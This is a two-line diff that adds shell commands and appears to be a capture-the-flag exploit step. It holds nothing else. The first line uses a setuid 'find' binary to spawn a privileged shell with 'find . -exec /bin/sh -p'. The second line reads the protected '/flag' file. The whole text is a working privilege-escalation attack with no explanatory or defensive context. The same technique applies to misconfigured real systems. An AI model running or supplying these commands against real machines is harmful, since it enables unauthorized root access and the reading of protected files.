@@ -1,0 +1,2 @@
+find . -exec /bin/sh -p \;
+cat /flag
